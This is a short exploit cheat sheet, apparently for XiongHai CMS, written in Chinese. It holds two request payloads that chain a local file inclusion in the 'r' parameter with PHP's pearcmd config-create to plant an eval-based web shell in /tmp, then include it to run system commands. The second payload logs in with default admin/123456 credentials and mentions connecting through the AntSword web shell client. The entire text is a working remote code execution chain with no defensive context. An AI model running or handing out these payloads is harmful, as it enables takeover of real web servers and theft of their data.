# 熊海CMS pearcmd

```bash
# payload1
/?+config-create+/&r=../../../../../../../../../usr/share/pear/pearcmd&<?=eval($_REQUEST[1]);?>+/tmp/aaa123.php
/?r=../../../../../../../../../tmp/aaa123&1=system('ls+/');

# payload2
admin/123456 登录
/admin/index.php?+config-create+/&r=../../../../../../../../../../usr/share/php/pearcmd&/<?=eval($_POST[cmd]);?>+../../../../../../../../tmp/1.php
/admin/index.php?r=../../../../../../../../../../tmp/1 # 蚁剑连接
```
